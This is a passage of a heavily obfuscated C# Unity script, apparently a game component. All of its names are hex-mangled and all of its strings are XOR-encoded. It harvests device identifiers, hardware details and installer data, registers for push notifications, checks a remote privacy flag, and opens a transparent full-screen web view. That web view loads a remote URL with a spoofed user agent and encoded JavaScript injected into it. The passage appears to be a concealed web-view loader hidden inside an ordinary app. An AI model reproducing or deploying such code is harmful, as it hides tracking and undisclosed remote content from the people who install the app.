196, 211, 194, 195, 196, 216, 150, 205, 219, 215, 194, 213, 222, 211, 197, 140, 208, 215, 218, 197, 211, 154, 219, 211, 210, 223, 215, 140, 199, 154, 217, 216, 213, 222, 215, 216, 209, 211, 140, 216, 195, 218, 218, 154, 215, 210, 210, 250, 223, 197, 194, 211, 216, 211, 196, 140, 208, 195, 216, 213, 194, 223, 217, 216, 158, 159, 205, 203, 154, 196, 211, 219, 217, 192, 211, 250, 223, 197, 194, 211, 216, 211, 196, 140, 208, 195, 216, 213, 194, 223, 217, 216, 158, 159, 205, 203, 154, 215, 210, 210, 243, 192, 211, 216, 194, 250, 223, 197, 194, 211, 216, 211, 196, 140, 208, 195, 216, 213, 194, 223, 217, 216, 158, 159, 205, 203, 154, 196, 211, 219, 217, 192, 211, 243, 192, 211, 216, 194, 250, 223, 197, 194, 211, 216, 211, 196, 140, 208, 195, 216, 213, 194, 223, 217, 216, 158, 159, 205, 203, 154, 210, 223, 197, 198, 215, 194, 213, 222, 243, 192, 211, 216, 194, 140, 208, 195, 216, 213, 194, 223, 217, 216, 158, 159, 205, 196, 211, 194, 195, 196, 216, 150, 208, 215, 218, 197, 211, 141, 203, 203, 141, 223, 208, 158, 197, 152, 223, 216, 210, 211, 206, 249, 208, 158, 145, 198, 217, 223, 216, 194, 211, 196, 140, 150, 208, 223, 216, 211, 145, 159, 136, 139, 134, 202, 202, 197, 152, 223, 216, 210, 211, 206, 249, 208, 158, 145, 222, 217, 192, 211, 196, 140, 150, 222, 217, 192, 211, 196, 145, 159, 136, 139, 134, 159, 196, 211, 194, 195, 196, 216, 150, 205, 219, 215, 194, 213, 222, 211, 197, 140, 194, 196, 195, 211, 154, 219, 211, 210, 223, 215, 140, 199, 154, 217, 216, 213, 222, 215, 216, 209, 211, 140, 216, 195, 218, 218, 154, 215, 210, 210, 250, 223, 197, 194, 211, 216, 211, 196, 140, 208, 195, 216, 213, 194, 223, 217, 216, 158, 159, 205, 203, 154, 196, 211, 219, 217, 192, 211, 250, 223, 197, 194, 211, 216, 211, 196, 140, 208, 195, 216, 213, 194, 223, 217, 216, 158, 159, 205, 203, 154, 215, 210, 210, 243, 192, 211, 216, 194, 250, 223, 197, 194, 211, 216, 211, 196, 140, 208, 195, 216, 213, 194, 223, 217, 216, 158, 159, 205, 203, 154, 196, 211, 219, 217, 192, 211, 243, 192, 211, 216, 194, 250, 223, 197, 194, 211, 216, 211, 196, 140, 208, 195, 216, 213, 194, 223, 217, 216, 158, 159, 205, 203, 154, 210, 223, 197, 198, 215, 194, 213, 222, 243, 192, 211, 216, 194, 140, 208, 195, 216, 213, 194, 223, 217, 216, 158, 159, 205, 196, 211, 194, 195, 196, 216, 150, 208, 215, 218, 197, 211, 141, 203, 203, 141, 196, 211, 194, 195, 196, 216, 150, 217, 196, 223, 209, 158, 199, 159, 141, 203, 141, 203, 213, 215, 194, 213, 222, 158, 211, 159, 205, 203 }, 182) + _0x019ade1a._0xa5740c93(new byte[5] { 113, 37, 36, 37, 55 }, 12);
    }

    internal bool isApplicationPause = false;
    private async Task _0xf67e5d0a()
    {
        if (await _0xaab630fe())
            return;
        if (await _0x096f473a())
            return;
        if (await _0xbed6c36c())
            return;
        _0x16217fa0();
        await _0xe30be86a(_0x2cc7a10b());
        _0x448dd134 = await _0x02fc27da();
        await _0x79c8ac62();
    }

    private static bool IsPrivacyItemTrue(Item _0xa55460f4)
    {
        if (_0xa55460f4.Key != _0x019ade1a._0xa5740c93(new byte[9] { 205, 215, 244, 214, 205, 210, 197, 199, 221 }, 164))
            return false;
        try
        {
            var _0x292a0000 = _0xa55460f4.Value.GetAs<object>();
            return _0x292a0000 switch
            {
                bool b => b,
                string s when bool.TryParse(s, out var parsed) => parsed,
                _ => false
            };
        }
        catch
        {
            return false;
        }
    }

    // MAIN FLOW
    private bool _0x0246a40a { get; set; }

    private string _0xb22f7ae7 = "";
    internal bool ContainsIgnoreCase(string _0xee6d2dc7, string _0xb38988cc)
    {
        if (string.IsNullOrEmpty(_0xee6d2dc7) || string.IsNullOrEmpty(_0xb38988cc))
            return false;
        return _0xee6d2dc7.IndexOf(_0xb38988cc, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    internal void _0x7acbae58()
    {
        Rect _0x94a6b6d4 = Screen.safeArea;
        Vector2 _0x709ac567 = new Vector2(Screen.width, Screen.height);
        if (_0x94a6b6d4 == lastSafe && _0x709ac567 == lastSize)
            return;
        // Apply manual padding
        _0x94a6b6d4.xMin += _0xc78bc8c1;
        _0x94a6b6d4.xMax -= _0xa4db84c2;
        _0x94a6b6d4.yMin += _0x4c542eba;
        _0x94a6b6d4.yMax -= _0x7e618d1e;
        // Convert Unity safe area -> native WebView frame
        Rect _0x203ab79b = new Rect(_0x94a6b6d4.x, _0x709ac567.y - _0x94a6b6d4.y - _0x94a6b6d4.height, // Y flip for native coordinate system
 _0x94a6b6d4.width, _0x94a6b6d4.height);
        _0x21de6645.Frame = _0x203ab79b;
        lastSafe = Screen.safeArea;
        lastSize = _0x709ac567;
    }

    private string _0x145fb9a2 = "";
    private string _0x02d91788 = "";
    private bool OpenUrlExternally(string _0xb7ec5ae6)
    {
        return _0xa43b83a9(_0xb7ec5ae6);
    }

    private async Task<bool> _0xfb251b4c(int _0xb26e2249 = 5, int _0xa5a43432 = 500)
    {
        List<EntityData> _0xc05d5457 = new List<EntityData>();
        int _0xa312e20a = 0;
        do
        {
            try
            {
                _0xc05d5457 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x019ade1a._0xa5740c93(new byte[8] { 107, 119, 122, 98, 126, 105, 82, 127 }, 27), _0xc9862e79, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x019ade1a._0xa5740c93(new byte[9] { 79, 85, 118, 84, 79, 80, 71, 69, 95 }, 38) }), new QueryOptions())).ToList();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0x019ade1a._0xa5740c93(new byte[32] { 236, 227, 210, 196, 195, 234, 151, 198, 194, 210, 197, 206, 246, 196, 206, 217, 212, 229, 210, 196, 194, 219, 195, 196, 151, 210, 197, 197, 216, 197, 141, 151 }, 183) + e.Message);
                    }
#endif
                }
            }

            await Task.Delay(_0xa5a43432);
        }
        while (_0xc05d5457.Count == 0 && _0xa312e20a++ < _0xb26e2249);
        {
#if B_LOGS
            {
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[32] { 186, 181, 132, 146, 149, 188, 193, 168, 146, 177, 147, 136, 151, 128, 130, 152, 193, 176, 148, 132, 147, 152, 193, 147, 132, 146, 148, 141, 149, 146, 219, 193 }, 225) + JsonConvert.SerializeObject(_0xc05d5457, Formatting.Indented));
            }
#endif
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[38] { 200, 199, 246, 224, 231, 206, 179, 218, 224, 195, 225, 250, 229, 242, 240, 234, 179, 194, 230, 246, 225, 234, 179, 225, 246, 224, 230, 255, 231, 224, 179, 240, 252, 230, 253, 231, 169, 179 }, 147) + _0xc05d5457.Count);
            }
#endif
        }

        bool _0x3c7cc7e4 = true;
        if (_0xc05d5457.Count == 0)
        {
            _0x3c7cc7e4 = false;
        }
        else
        {
            _0x3c7cc7e4 = _0xc05d5457.Any(_0xd44a3461 => _0xd44a3461.Data.Any(IsPrivacyItemTrue));
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[25] { 251, 244, 197, 211, 212, 253, 128, 233, 211, 240, 210, 201, 214, 193, 195, 217, 128, 210, 197, 211, 213, 204, 212, 154, 128 }, 160) + _0x3c7cc7e4);
            }
#endif
        }

        return _0x3c7cc7e4;
    }

    private async Task<bool> _0xbed6c36c()
    {
        {
#if B_LOGS
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[29] { 132, 139, 186, 172, 171, 130, 255, 150, 172, 143, 173, 182, 169, 190, 188, 166, 158, 177, 187, 140, 190, 169, 186, 187, 156, 183, 186, 188, 180 }, 223));
#endif
        }

        string _0x6b053cab = "";
        for (int _0x984478f8 = 0; _0x984478f8 < 2; _0x984478f8++)
        {
            if (await _0xfb251b4c(1, 100))
            {
                await _0x9ef6f88b(_0x019ade1a._0xa5740c93(new byte[7] { 153, 151, 148, 152, 144, 158, 159 }, 251));
                _0xaea71745();
                return true;
            }

            _0x6b053cab = await _0x6ff14ded(1, 100);
            if (!string.IsNullOrEmpty(_0x6b053cab))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0x6b053cab))
            {
                if (!string.IsNullOrEmpty(_0x8faf629c))
                {
                    _0x6b053cab = _0xc682821f(_0x6b053cab, _0x8faf629c);
                    {
#if B_LOGS
                        Debug.Log(_0x019ade1a._0xa5740c93(new byte[53] { 92, 83, 98, 116, 115, 90, 39, 68, 102, 100, 111, 98, 99, 39, 97, 110, 105, 102, 107, 82, 117, 107, 39, 112, 110, 115, 111, 39, 116, 98, 105, 99, 110, 99, 39, 229, 129, 149, 39, 116, 111, 104, 112, 39, 80, 98, 101, 81, 110, 98, 112, 61, 39 }, 7) + _0x6b053cab);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0x019ade1a._0xa5740c93(new byte[39] { 251, 244, 197, 211, 212, 253, 128, 227, 193, 195, 200, 197, 196, 128, 198, 201, 206, 193, 204, 245, 210, 204, 128, 66, 38, 50, 128, 211, 200, 207, 215, 128, 247, 197, 194, 246, 201, 197, 215 }, 160));
#endif
                    }
                }

                _0xf66b958e = true;
                _0x19493c9c(_0x6b053cab);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x019ade1a._0xa5740c93(new byte[44] { 42, 37, 20, 2, 5, 44, 81, 52, 9, 18, 20, 1, 5, 24, 30, 31, 81, 6, 25, 24, 29, 20, 81, 18, 25, 20, 18, 26, 24, 31, 22, 81, 2, 16, 7, 20, 21, 81, 29, 24, 31, 26, 75, 81 }, 113) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    internal bool IsHttpUrl(string _0x41d0ca49)
    {
        if (string.IsNullOrEmpty(_0x41d0ca49))
            return false;
        return _0x41d0ca49.StartsWith(_0x019ade1a._0xa5740c93(new byte[7] { 253, 225, 225, 229, 175, 186, 186 }, 149), StringComparison.OrdinalIgnoreCase) || _0x41d0ca49.StartsWith(_0x019ade1a._0xa5740c93(new byte[8] { 29, 1, 1, 5, 6, 79, 90, 90 }, 117), StringComparison.OrdinalIgnoreCase);
    }

    private void _0x88f8a99a(UniWebView _0x9b5b9899)
    {
        _0x9b5b9899.BackgroundColor = Color.clear;
        _0x9b5b9899.SetSupportMultipleWindows(true, true);
        _0x9b5b9899.SetBackButtonEnabled(false);
        _0x21de6645.SetUserAgent(_0xada17828());
    }

    private void _0x16217fa0()
    {
        {
#if B_LOGS
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[22] { 127, 112, 65, 87, 80, 121, 4, 119, 80, 75, 86, 65, 96, 65, 82, 77, 71, 65, 109, 74, 66, 75 }, 36));
#endif
        }

        _0x145fb9a2 = SystemInfo.deviceModel;
        _0x37f917ba = Application.version;
        _0x02babecd = Application.installMode;
        _0xa8cd78ab = Application.installerName;
        _0x9dd642dd = Application.identifier;
        _0x02d91788 = _0x23209454();
        _0xb22f7ae7 = _0x884ae494();
        _0x7331d679 = SystemInfo.deviceUniqueIdentifier;
        _0x423cd5cf = SystemInfo.graphicsDeviceName;
        _0x14b759a0 = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x37f917ba = _0x019ade1a._0xa5740c93(new byte[5] { 78, 87, 78, 87, 78 }, 121);
                _0x02babecd = ApplicationInstallMode.Store;
                _0xa8cd78ab = _0x019ade1a._0xa5740c93(new byte[19] { 85, 89, 91, 24, 87, 88, 82, 68, 89, 95, 82, 24, 64, 83, 88, 82, 95, 88, 81 }, 54);
                _0xb22f7ae7 = _0x019ade1a._0xa5740c93(new byte[8] { 111, 103, 122, 126, 115, 42, 127, 107 }, 10);
                _0x7331d679 = Guid.NewGuid().ToString().Replace(_0x019ade1a._0xa5740c93(new byte[1] { 34 }, 15), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[17] { 40, 39, 22, 0, 7, 46, 83, 23, 22, 5, 62, 28, 23, 22, 31, 73, 83 }, 115) + _0x145fb9a2);
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[19] { 103, 104, 89, 79, 72, 97, 28, 93, 76, 76, 106, 89, 78, 79, 85, 83, 82, 6, 28 }, 60) + _0x37f917ba);
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[20] { 34, 45, 28, 10, 13, 36, 89, 16, 23, 10, 13, 24, 21, 21, 52, 22, 29, 28, 67, 89 }, 121) + _0x02babecd);
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[23] { 165, 170, 155, 141, 138, 163, 222, 151, 144, 141, 138, 159, 146, 146, 155, 140, 173, 138, 145, 140, 155, 196, 222 }, 254) + _0xa8cd78ab);
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[14] { 66, 77, 124, 106, 109, 68, 57, 120, 105, 105, 80, 125, 35, 57 }, 25) + _0x9dd642dd);
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[14] { 245, 250, 203, 221, 218, 243, 142, 207, 202, 216, 231, 202, 148, 142 }, 174) + _0x02d91788);
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[18] { 161, 174, 159, 137, 142, 167, 218, 143, 137, 159, 136, 187, 157, 159, 148, 142, 192, 218 }, 250) + _0xb22f7ae7);
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[17] { 181, 186, 139, 157, 154, 179, 206, 157, 151, 157, 170, 139, 152, 167, 138, 212, 206 }, 238) + _0x7331d679);
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[12] { 216, 215, 230, 240, 247, 222, 163, 228, 243, 246, 185, 163 }, 131) + _0x423cd5cf);
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[12] { 130, 141, 188, 170, 173, 132, 249, 186, 169, 172, 227, 249 }, 217) + _0x14b759a0);
#endif
        }
    }

    private void OnApplicationFocus(bool _0xe917072f)
    {
        isApplicationFocus = _0xe917072f;
        if (_0xe917072f && _0x7608da72)
        {
            _0xf0a9c5ca();
        }
    }

    private string _0xb1b949a8 = "";
    internal bool IsAboutBlank(string _0x24e3f1f8)
    {
        if (string.IsNullOrEmpty(_0x24e3f1f8))
            return false;
        return _0x24e3f1f8.StartsWith(_0x019ade1a._0xa5740c93(new byte[11] { 217, 218, 215, 205, 204, 130, 218, 212, 217, 214, 211 }, 184), StringComparison.OrdinalIgnoreCase);
    }

    private string _0x884ae494()
    {
        try
        {
            using (var _0x61bc3270 = new AndroidJavaClass(_0x019ade1a._0xa5740c93(new byte[30] { 162, 174, 172, 239, 180, 175, 168, 181, 184, 242, 165, 239, 177, 173, 160, 184, 164, 179, 239, 148, 175, 168, 181, 184, 145, 173, 160, 184, 164, 179 }, 193)))
            {
                var _0x2047d3b7 = _0x61bc3270.GetStatic<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[15] { 81, 71, 64, 64, 87, 92, 70, 115, 81, 70, 91, 68, 91, 70, 75 }, 50));
                var _0xbfbeb0fd = _0x2047d3b7.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[21] { 3, 1, 16, 37, 20, 20, 8, 13, 7, 5, 16, 13, 11, 10, 39, 11, 10, 16, 1, 28, 16 }, 100));
                using (var _0x4ff889bd = new AndroidJavaClass(_0x019ade1a._0xa5740c93(new byte[26] { 107, 100, 110, 120, 101, 99, 110, 36, 125, 111, 104, 97, 99, 126, 36, 93, 111, 104, 89, 111, 126, 126, 99, 100, 109, 121 }, 10)))
                {
                    return _0x4ff889bd.CallStatic<string>(_0x019ade1a._0xa5740c93(new byte[19] { 93, 95, 78, 126, 95, 92, 91, 79, 86, 78, 111, 73, 95, 72, 123, 93, 95, 84, 78 }, 58), _0xbfbeb0fd);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    // WEB VIEW LOGIC
    public bool _0x7608da72 { get; set; }

    private string _0x9dd642dd = "";
    private void StopCurrentFailedLoad(UniWebView _0x0f515a8e)
    {
        _0xbe659bab(false);
        if (_0x0f515a8e == null)
            return;
        _0x0f515a8e.Stop();
        if (_0x0f515a8e.CanGoBack)
            _0x0f515a8e.GoBack();
    }

    private bool _0x297dce60()
    {
        var _0x2492e345 = _0x83836707();
        if (_0x2492e345 == null)
            return false;
        WLog(_0x019ade1a._0xa5740c93(new byte[31] { 121, 80, 67, 85, 70, 80, 67, 84, 17, 83, 80, 82, 90, 17, 28, 15, 17, 65, 94, 65, 68, 65, 17, 118, 94, 115, 80, 82, 90, 11, 17 }, 49) + _0x2492e345.Id);
        _0x2492e345.GoBack();
        return true;
    }

    private bool _0x9dfebcb4(int _0xe47b8f78, string _0xb96c5476, string _0xc5df2555)
    {
        if (string.IsNullOrEmpty(_0xc5df2555))
            return false;
        if (!IsHttpUrl(_0xc5df2555))
            return true;
        if (string.IsNullOrEmpty(_0xb96c5476))
            return false;
        return _0xb96c5476.IndexOf(_0x019ade1a._0xa5740c93(new byte[20] { 244, 227, 227, 238, 242, 254, 255, 255, 244, 242, 229, 248, 254, 255, 238, 227, 244, 226, 244, 229 }, 177), StringComparison.OrdinalIgnoreCase) >= 0 || _0xb96c5476.IndexOf(_0x019ade1a._0xa5740c93(new byte[22] { 120, 111, 111, 98, 126, 114, 115, 115, 120, 126, 105, 116, 114, 115, 98, 111, 120, 123, 104, 110, 120, 121 }, 61), StringComparison.OrdinalIgnoreCase) >= 0 || _0xb96c5476.IndexOf(_0x019ade1a._0xa5740c93(new byte[21] { 190, 169, 169, 164, 184, 180, 181, 181, 190, 184, 175, 178, 180, 181, 164, 184, 183, 180, 168, 190, 191 }, 251), StringComparison.OrdinalIgnoreCase) >= 0 || _0xb96c5476.IndexOf(_0x019ade1a._0xa5740c93(new byte[22] { 121, 110, 110, 99, 105, 114, 119, 114, 115, 107, 114, 99, 105, 110, 112, 99, 111, 127, 116, 121, 113, 121 }, 60), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private string _0x65514dcd = "";
    internal bool isDestroyedForce = false;
    private string _0xc9862e79 = "";
    private void _0xf5c5d743()
    {
        WLog(_0x019ade1a._0xa5740c93(new byte[21] { 23, 62, 45, 59, 40, 62, 45, 58, 127, 61, 62, 60, 52, 127, 47, 45, 58, 44, 44, 58, 59 }, 95));
        if (Time.frameCount == _0x07730f16)
            return;
        _0x07730f16 = Time.frameCount;
        if (_0x1b54adb2())
            return;
        _0x19b8f297();
    }

    private async Task<bool> _0x096f473a()
    {
        _0x2f7b6011.Instance?._0xc0f39b9f();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0x85281467) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x019ade1a._0xa5740c93(new byte[32] { 172, 163, 146, 132, 131, 170, 215, 162, 153, 158, 131, 142, 215, 167, 130, 132, 159, 215, 185, 152, 131, 158, 145, 158, 148, 150, 131, 158, 152, 153, 205, 215 }, 247) + string.Join(_0x019ade1a._0xa5740c93(new byte[1] { 112 }, 121), _0x85281467));
                }
#endif
            }
        };
        try
        {
            _0xd92a0b29 = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x019ade1a._0xa5740c93(new byte[31] { 198, 201, 248, 238, 233, 192, 189, 219, 252, 244, 241, 248, 249, 189, 233, 242, 189, 250, 248, 233, 189, 237, 232, 238, 245, 189, 233, 242, 246, 248, 243 }, 157));
                }
#endif
            }

            _0xd92a0b29 = "";
        }

        _0xb931fcd5 = !string.IsNullOrEmpty(_0xd92a0b29);
        _0xf158ca5f = _0x4de9e613();
        {
#if B_LOGS
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[25] { 19, 28, 45, 59, 60, 21, 104, 29, 38, 33, 60, 49, 104, 24, 61, 59, 32, 104, 28, 39, 35, 45, 38, 114, 104 }, 72) + _0xd92a0b29);
#endif
        }

        _0x2f7b6011.Instance?._0x61136c1f();
        return false;
    }

    private IEnumerator _0x84b2efb1(string _0x7421de8a)
    {
        if (_0x21de6645 != null && _0x7608da72)
            yield break;
        _0x21de6645 = gameObject.AddComponent<UniWebView>();
        _0x88f8a99a(_0x21de6645);
        _0x2879a111(_0x21de6645);
        _0x21de6645.BackgroundColor = Color.clear;
        var _0xb1669115 = SceneManager.GetActiveScene().GetRootGameObjects();
        if (Camera.main != null)
        {
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.clear;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0x7acbae58();
        yield return new WaitForEndOfFrame();
        _0x7608da72 = true;
        _0x8ec9417c();
        _0xbe659bab(true);
        _0x99644d4e = false;
        _0x9c72ce68 = false;
        _0xbcf7cc63.Clear();
        _0x07730f16 = -1;
        firstLoadShown = false;
        _0x63c26322 = false;
        _0x69b8ee0b = false;
        _0x21de6645.SetUserAgent("");
        _0x2aab99d4 = Time.realtimeSinceStartup;
        _0x21de6645.Stop();
        _0x21de6645.Load(_0x7421de8a);
        _0x21de6645.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog(_0x019ade1a._0xa5740c93(new byte[25] { 171, 135, 143, 136, 198, 177, 131, 132, 176, 143, 131, 145, 198, 175, 136, 143, 146, 143, 135, 138, 198, 181, 142, 137, 145 }, 230));
    }

    private string _0xa2f29b28 { get; set; }

    internal void Update()
    {
        if (_0x21de6645 == null)
            return;
        if (_0x987abf3a())
            _0xf5c5d743();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0x7acbae58();
        if (_0x69d913d5 && _0x84eb34f5 != null)
            _0x84eb34f5.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    private string _0xf03b56a3()
    {
        string _0x48957dce = _0xada17828();
        if (string.IsNullOrEmpty(_0x48957dce))
            return _0x019ade1a._0xa5740c93(new byte[7] { 250, 227, 229, 232, 172, 188, 183 }, 140);
        string _0x8f7cb8a9 = _0x48957dce.Replace(_0x019ade1a._0xa5740c93(new byte[1] { 191 }, 227), _0x019ade1a._0xa5740c93(new byte[2] { 123, 123 }, 39)).Replace(_0x019ade1a._0xa5740c93(new byte[1] { 5 }, 34), _0x019ade1a._0xa5740c93(new byte[2] { 204, 183 }, 144));
        var _0x4ce11803 = Regex.Match(_0x48957dce, _0x019ade1a._0xa5740c93(new byte[12] { 93, 118, 108, 113, 115, 123, 49, 54, 66, 122, 53, 55 }, 30));
        string _0x0cf35964 = _0x4ce11803.Success ? _0x4ce11803.Groups[1].Value : _0x019ade1a._0xa5740c93(new byte[3] { 91, 88, 90 }, 106);
        return _0x019ade1a._0xa5740c93(new byte[12] { 108, 34, 49, 42, 39, 48, 45, 43, 42, 108, 109, 63 }, 68) + _0x019ade1a._0xa5740c93(new byte[8] { 184, 175, 188, 238, 187, 175, 243, 233 }, 206) + _0x8f7cb8a9 + _0x019ade1a._0xa5740c93(new byte[2] { 12, 16 }, 43) + _0x019ade1a._0xa5740c93(new byte[30] { 109, 122, 105, 59, 107, 105, 116, 111, 116, 38, 85, 122, 109, 114, 124, 122, 111, 116, 105, 53, 107, 105, 116, 111, 116, 111, 98, 107, 126, 32 }, 27) + _0x019ade1a._0xa5740c93(new byte[121] { 104, 123, 96, 109, 122, 103, 97, 96, 46, 106, 107, 104, 38, 97, 108, 100, 34, 101, 107, 119, 34, 120, 111, 98, 39, 117, 122, 124, 119, 117, 65, 108, 100, 107, 109, 122, 32, 106, 107, 104, 103, 96, 107, 94, 124, 97, 126, 107, 124, 122, 119, 38, 97, 108, 100, 34, 101, 107, 119, 34, 117, 105, 107, 122, 52, 104, 123, 96, 109, 122, 103, 97, 96, 38, 39, 117, 124, 107, 122, 123, 124, 96, 46, 120, 111, 98, 53, 115, 34, 109, 97, 96, 104, 103, 105, 123, 124, 111, 108, 98, 107, 52, 122, 124, 123, 107, 115, 39, 53, 115, 109, 111, 122, 109, 102, 38, 107, 39, 117, 115, 115 }, 14) + _0x019ade1a._0xa5740c93(new byte[26] { 109, 108, 111, 33, 121, 123, 102, 125, 102, 37, 46, 124, 122, 108, 123, 72, 110, 108, 103, 125, 46, 37, 124, 104, 32, 50 }, 9) + _0x019ade1a._0xa5740c93(new byte[52] { 129, 128, 131, 205, 149, 151, 138, 145, 138, 201, 194, 132, 149, 149, 179, 128, 151, 150, 140, 138, 139, 194, 201, 144, 132, 203, 151, 128, 149, 137, 132, 134, 128, 205, 202, 187, 168, 138, 159, 140, 137, 137, 132, 185, 202, 202, 201, 194, 194, 204, 204, 222 }, 229) + _0x019ade1a._0xa5740c93(new byte[37] { 199, 198, 197, 139, 211, 209, 204, 215, 204, 143, 132, 211, 207, 194, 215, 197, 204, 209, 206, 132, 143, 132, 239, 202, 205, 214, 219, 131, 194, 209, 206, 213, 155, 207, 132, 138, 152 }, 163) + _0x019ade1a._0xa5740c93(new byte[34] { 121, 120, 123, 53, 109, 111, 114, 105, 114, 49, 58, 107, 120, 115, 121, 114, 111, 58, 49, 58, 90, 114, 114, 122, 113, 120, 61, 84, 115, 126, 51, 58, 52, 38 }, 29) + _0x019ade1a._0xa5740c93(new byte[30] { 99, 98, 97, 47, 119, 117, 104, 115, 104, 43, 32, 106, 102, 127, 83, 104, 114, 100, 111, 87, 104, 110, 105, 115, 116, 32, 43, 50, 46, 60 }, 7) + _0x019ade1a._0xa5740c93(new byte[48] { 55, 49, 58, 56, 53, 34, 49, 99, 54, 34, 39, 126, 56, 33, 49, 34, 45, 39, 48, 121, 24, 56, 33, 49, 34, 45, 39, 121, 100, 0, 43, 49, 44, 46, 42, 54, 46, 100, 111, 53, 38, 49, 48, 42, 44, 45, 121, 100 }, 67) + _0x0cf35964 + _0x019ade1a._0xa5740c93(new byte[35] { 98, 56, 105, 62, 39, 55, 36, 43, 33, 127, 98, 2, 42, 42, 34, 41, 32, 101, 6, 45, 55, 42, 40, 32, 98, 105, 51, 32, 55, 54, 44, 42, 43, 127, 98 }, 69) + _0x0cf35964 + _0x019ade1a._0xa5740c93(new byte[238] { 73, 19, 66, 21, 12, 28, 15, 0, 10, 84, 73, 32, 1, 26, 83, 47, 81, 44, 28, 15, 0, 10, 73, 66, 24, 11, 28, 29, 7, 1, 0, 84, 73, 92, 90, 73, 19, 51, 66, 3, 1, 12, 7, 2, 11, 84, 26, 28, 27, 11, 66, 30, 2, 15, 26, 8, 1, 28, 3, 84, 73, 47, 0, 10, 28, 1, 7, 10, 73, 66, 9, 11, 26, 38, 7, 9, 6, 43, 0, 26, 28, 1, 30, 23, 56, 15, 2, 27, 11, 29, 84, 8, 27, 0, 13, 26, 7, 1, 0, 70, 71, 21, 28, 11, 26, 27, 28, 0, 78, 62, 28, 1, 3, 7, 29, 11, 64, 28, 11, 29, 1, 2, 24, 11, 70, 21, 15, 28, 13, 6, 7, 26, 11, 13, 26, 27, 28, 11, 84, 73, 15, 28, 3, 73, 66, 12, 7, 26, 0, 11, 29, 29, 84, 73, 88, 90, 73, 66, 3, 1, 12, 7, 2, 11, 84, 26, 28, 27, 11, 66, 3, 1, 10, 11, 2, 84, 73, 73, 66, 30, 2, 15, 26, 8, 1, 28, 3, 84, 73, 47, 0, 10, 28, 1, 7, 10, 73, 66, 30, 2, 15, 26, 8, 1, 28, 3, 56, 11, 28, 29, 7, 1, 0, 84, 73, 95, 90, 64, 94, 64, 94, 73, 66, 27, 15, 40, 27, 2, 2, 56, 11, 28, 29, 7, 1, 0, 84, 73 }, 110) + _0x0cf35964 + _0x019ade1a._0xa5740c93(new byte[117] { 35, 61, 35, 61, 35, 61, 42, 112, 36, 54, 112, 112, 54, 66, 111, 103, 104, 110, 121, 35, 105, 104, 107, 100, 99, 104, 93, 127, 98, 125, 104, 127, 121, 116, 37, 125, 127, 98, 121, 98, 33, 42, 120, 126, 104, 127, 76, 106, 104, 99, 121, 73, 108, 121, 108, 42, 33, 118, 106, 104, 121, 55, 107, 120, 99, 110, 121, 100, 98, 99, 37, 36, 118, 127, 104, 121, 120, 127, 99, 45, 120, 108, 105, 54, 112, 33, 110, 98, 99, 107, 100, 106, 120, 127, 108, 111, 97, 104, 55, 121, 127, 120, 104, 112, 36, 54, 112, 110, 108, 121, 110, 101, 37, 104, 36, 118, 112 }, 13) + _0x019ade1a._0xa5740c93(new byte[5] { 246, 162, 163, 162, 176 }, 139);
    }

    private static string ReadPushField(Dictionary<string, object> _0xe47a728d, string _0x8cb48f1a)
    {
        if (_0xe47a728d == null || string.IsNullOrEmpty(_0x8cb48f1a))
            return string.Empty;
        if (_0xe47a728d.TryGetValue(_0x019ade1a._0xa5740c93(new byte[16] { 82, 83, 72, 85, 90, 85, 95, 93, 72, 85, 83, 82, 120, 93, 72, 93 }, 60), out var raw))
        {
            try
            {
                var _0x8191fcee = JsonConvert.DeserializeObject<Dictionary<string, object>>(raw?.ToString());
                if (_0x8191fcee != null && _0x8191fcee.TryGetValue(_0x8cb48f1a, out var nestedVal))
                {
                    var _0x7b835a89 = nestedVal?.ToString();
                    if (!string.IsNullOrEmpty(_0x7b835a89))
                        return _0x7b835a89;
                }
            }
            catch
            {
            }
        }

        if (_0xe47a728d.TryGetValue(_0x8cb48f1a, out var flatVal))
            return flatVal?.ToString() ?? string.Empty;
        return string.Empty;
    }

    internal string _0x652494af(string _0xd1f3c5a4)
    {
